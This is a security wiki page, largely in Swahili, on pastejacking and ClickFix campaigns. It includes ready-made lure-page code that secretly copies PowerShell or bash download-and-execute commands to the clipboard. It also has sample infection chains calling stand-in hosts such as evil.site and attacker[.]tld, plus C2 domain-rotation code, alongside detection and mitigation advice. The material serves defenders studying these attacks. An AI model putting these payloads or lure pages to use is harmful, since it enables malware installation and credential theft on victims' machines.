# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> "Usibandike chochote ambacho hukakopi mwenyewe." – ushauri wa zamani lakini bado unaofaa

## Muhtasari

Clipboard hijacking – pia inajulikana kama *pastejacking* – inatumia ukweli kwamba watumiaji kwa kawaida hufanya copy-and-paste ya amri bila kuzichunguza. Tovuti hatarishi (au muktadha wowote unaoweza kutumia JavaScript kama Electron au Desktop application) kwa njia ya programu inaweka maandishi yanayodhibitiwa na mshambuliaji kwenye system clipboard. Waathiriwa hufahamishwa, kwa kawaida kupitia maagizo ya social-engineering yaliyotengenezwa kwa uangalifu, kubonyeza **Win + R** (Run dialog), **Win + X** (Quick Access / PowerShell), au kufungua terminal na *paste* maudhui ya clipboard, na mara moja kutekeleza amri yoyote.

Kwa sababu **no file is downloaded and no attachment is opened**, mbinu hii inapita udhibiti mkubwa wa usalama wa barua pepe na maudhui ya wavuti ambayo hufuatilia attachments, macros au direct command execution. Kwa hivyo shambulio hili ni maarufu katika phishing campaigns zinazowasilisha malware za kawaida kama NetSupport RAT, Latrodectus loader au Lumma Stealer.

## Mabofyo ya “Copy” ya kulazimishwa na payloads zilizofichwa (macOS one-liners)

Baadhi ya macOS infostealers huiga tovuti za installer (mfano, Homebrew) na **kulazimisha matumizi ya kitufe cha “Copy”** ili watumiaji wasiweze kuonyesha tu maandishi yanayoonekana. Kuingia kwenye clipboard kunajumuisha amri ya installer inayotarajiwa pamoja na payload ya Base64 iliyoongezwa (mfano, `...; echo <b64> | base64 -d | sh`), hivyo paste moja inatekeleza zote mbili wakati UI inaficha hatua ya ziada.

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Kampeni za zamani zilitumia `document.execCommand('copy')`, zile mpya zinategemea isiyo sambatana **Clipboard API** (`navigator.clipboard.writeText`).

## Mtiririko wa ClickFix / ClearFake

1. Mtumiaji anatembelea tovuti iliyo typosquatted au compromised (mfano `docusign.sa[.]com`)
2. JavaScript ya **ClearFake** iliyolimbwa inaita helper `unsecuredCopyToClipboard()` ambao kimya kimya unaweka PowerShell one-liner iliyopangwa kwa Base64 kwenye clipboard.
3. Maelekezo ya HTML yanaambia mwathirika: *“Bonyeza **Win + R**, bandika amri na bonyeza Enter ili kutatua tatizo.”*
4. `powershell.exe` inaendesha, ikipakua archive inayojumuisha executable halali pamoja na DLL hatari (classic DLL sideloading).
5. Loader ina-decrypt hatua za ziada, inaingiza shellcode na kusakinisha persistence (mfano scheduled task) – hatimaye ikienda kuendesha NetSupport RAT / Latrodectus / Lumma Stealer.

### Mfano wa Mlolongo wa NetSupport RAT
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (Java WebStart halali) inatafuta katika saraka yake `msvcp140.dll`.
* DLL hatari inasuluhisha API wakati wa utekelezaji kwa kutumia **GetProcAddress**, inapakua binaries mbili (`data_3.bin`, `data_4.bin`) kupitia **curl.exe**, inazitafsiri kwa kutumia ufunguo wa rolling XOR `"https://google.com/"`, inaingiza shellcode ya mwisho na unzips **client32.exe** (NetSupport RAT) hadi `C:\ProgramData\SecurityCheck_v1\`.

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. Inapakua `la.txt` kwa **curl.exe**
2. Inatekeleza JScript downloader ndani ya **cscript.exe**
3. Inapakua MSI payload → inaweka `libcef.dll` kando ya programu iliyosainiwa → DLL sideloading → shellcode → Latrodectus.

### Lumma Stealer kupitia MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
Kiito cha **mshta** kinawasha script ya PowerShell iliyofichwa ambayo hupakua `PartyContinued.exe`, hutoa `Boat.pst` (CAB), hujenga tena `AutoIt3.exe` kupitia `extrac32` na kuunganisha faili, na hatimaye inaendesha script ya `.a3x` ambayo inapeleka vyeti vya kuingia vya kivinjari kwenda `sumeriavgv.digital`.

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)

Baadhi ya kampeni za ClickFix hupuuza kabisa upakuaji wa faili na kuwaelekeza wahanga kubandika one‑liner inayopakua na kutekeleza JavaScript kupitia WSH, kuifanya idumu, na kubadilisha C2 kila siku. Mfano wa mnyororo ulioshuhudiwa:
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Tabia kuu
- URL iliyofichwa inayorudishwa nyuma wakati wa utekelezaji ili kuzuia ukaguzi wa kawaida.
- JavaScript inajidumisha kupitia Startup LNK (WScript/CScript), na huchagua C2 kulingana na siku ya sasa – kuruhusu domain rotation ya haraka.

Fragment ndogo ya JS inayotumika kuzungusha C2s kwa tarehe:
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
Hatua inayofuata mara nyingi hueneza loader inayoweka persistence na kuvuta RAT (mfano, PureHVNC), mara nyingi ikifunga TLS kwa cheti kilicho hardcoded na kugawanya trafiki kwa vipande.

Mawazo ya utambuzi maalum kwa variant hii
- Mti wa michakato: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (au `cscript.exe`).
- Vielelezo vya kuanzishwa: LNK katika `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` ikiita WScript/CScript na path ya JS chini ya `%TEMP%`/`%APPDATA%`.
- Registry/RunMRU na telemetry ya mstari wa amri zenye `.split('').reverse().join('')` au `eval(a.responseText)`.
- Kurudia `powershell -NoProfile -NonInteractive -Command -` zenye payloads kubwa za stdin ili kuliwa script ndefu bila mistari ndefu ya amri.
- Scheduled Tasks zinazotekeleza baadaye LOLBins kama `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` chini ya task/path inayoonekana kama updater (mfano, `\GoogleSystem\GoogleUpdater`).

Uchunguzi wa vitisho
- Daily‑rotating C2 hostnames and URLs with `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>` pattern.
- Panga matukio ya kuandika clipboard ikifuatiwa na kubandika Win+R kisha utekelezaji wa mara moja wa `powershell.exe`.

Timu za blue zinaweza kuunganisha telemetry ya clipboard, uundaji wa mchakato na registry ili kubaini matumizi mabaya ya pastejacking:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` inahifadhi historia ya **Win + R** amri – angalia ingizo zisizo za kawaida za Base64 / zilizofichwa (obfuscated).
* Security Event ID **4688** (Process Creation) ambapo `ParentImage` == `explorer.exe` na `NewProcessName` in { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** kwa uundaji wa faili chini ya `%LocalAppData%\Microsoft\Windows\WinX\` au folda za muda kabla ya tukio la 4688 la kutiliwa shaka.
* EDR clipboard sensors (ikiwa zipo) – panga `Clipboard Write` ikifuatiwa mara moja na mchakato mpya wa PowerShell.

## IUAM-style verification pages (ClickFix Generator): clipboard copy-to-console + OS-aware payloads

Kampeni za hivi karibuni hutengeneza kwa wingi kurasa za uthibitisho bandia za CDN/browser ("Just a moment…", IUAM-style) zinazowalazimisha watumiaji kunakili amri maalum za OS kutoka clipboard yao katika consoles za native. Hii inaelekeza utekelezaji nje ya sandbox ya browser na inafanya kazi kwa Windows na macOS.

Tabia kuu za kurasa zinazotengenezwa na builder
- Utambuzi wa OS kupitia `navigator.userAgent` ili kubinafsisha payloads (Windows PowerShell/CMD vs. macOS Terminal). Decoys/no-ops za hiari kwa OS zisizoungwa mkono ili kudumisha udanganyifu.
- Nakili ya clipboard kiotomatiki kwenye vitendo vya UI visivyo hatari (checkbox/Copy) wakati maandishi yanayoonekana yanaweza kutofautiana na yaliyomo kwenye clipboard.
- Kuzuia mobile na popover yenye maelekezo hatua kwa hatua: Windows → Win+R→paste→Enter; macOS → open Terminal→paste→Enter.
- Obfuscation ya hiari na injector ya faili moja kuandika upya DOM ya tovuti iliyoharibiwa na UI ya uthibitisho iliyopangwa kwa Tailwind (haina haja ya usajili wa domain mpya).

Mfano: kutofanana kwa clipboard + branchi zenye uelewa wa OS
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
Udumu wa macOS wa utekelezaji wa awali
- Tumia `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` ili utekelezaji uendelee baada ya terminal kufungwa, ukipunguza alama zinazoonekana.

Kuchukua udhibiti wa ukurasa kwa njia ya ndani kwenye tovuti zilizoathiriwa
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
Mawazo ya utambuzi na uwindaji maalum kwa lures za mtindo wa IUAM
- Web: Kurasa zinazofunga Clipboard API kwenye widgets za uthibitisho; kutokulingana kati ya maandishi yanayoonyeshwa na payload ya clipboard; `navigator.userAgent` branching; Tailwind + single-page replace katika muktadha unaoshukiwa.
- Windows endpoint: `explorer.exe` → `powershell.exe`/`cmd.exe` muda mfupi baada ya mwingiliano na browser; batch/MSI installers zinatendwa kutoka `%TEMP%`.
- macOS endpoint: Terminal/iTerm ikianzisha `bash`/`curl`/`base64 -d` na `nohup` karibu na matukio ya kivinjari; kazi za background zikiendelea hata baada ya kufunga terminal.
- Linganisha historia ya `RunMRU` (Win+R) na uandishi wa clipboard na uundaji wa mchakato wa console uliofuata.

Tazama pia kwa mbinu zinazounga mkono

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## Kupunguza Hatari

1. Kuimarisha kivinjari – zima clipboard write-access (`dom.events.asyncClipboard.clipboardItem` n.k.) au hitaji ishara ya mtumiaji.
2. Uelewa wa usalama – fundisha watumiaji kuandika kwa mkono amri nyeti au kuzibandika kwanza kwenye mhariri wa maandishi.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control ili kuzuia one-liners zisizoidhinishwa.
4. Udhibiti wa mtandao – kata maombi ya kutoka nje kwa domeini zinazojulikana za pastejacking na malware C2.

## Mbinu zinazohusiana

* **Discord Invite Hijacking** mara nyingi hutumia njia ile ile ya ClickFix baada ya kuwavutia watumiaji kwenye server hatari:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## Marejeo

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)

{{#include ../../banners/hacktricks-training.md}}
